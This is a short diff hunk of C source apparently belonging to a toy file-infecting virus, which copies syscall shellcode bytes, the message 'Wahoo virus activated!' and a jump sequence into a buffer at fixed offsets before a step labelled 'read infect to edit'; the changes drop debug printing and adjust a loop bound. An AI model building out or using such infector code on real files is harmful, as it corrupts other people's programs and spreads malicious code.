@@ -19,14 +19,11 @@ int main() {
 
     for (int i = 0; i < 23; i++) {
         buffer[1102 + i] = syscall[i];
-        // print the binary
-        printf("%02x", (unsigned char)syscall[i]);
-        printf("\n");
     }
 
     // string
     char * str = "Wahoo virus activated!\n";
-    for (int i = 0; i < 24; i++) {
+    for (int i = 0; i < 23; i++) {
         buffer[1128 + i] = str[i];
     }
 
@@ -35,7 +32,6 @@ int main() {
                   "\xc6"; // ret
     for (int i = 0; i < 6; i++) {
         buffer[1171 + i] = jump[i];
-        printf("%02x", (unsigned char)jump[i]);
     }
 
     // read infect to edit
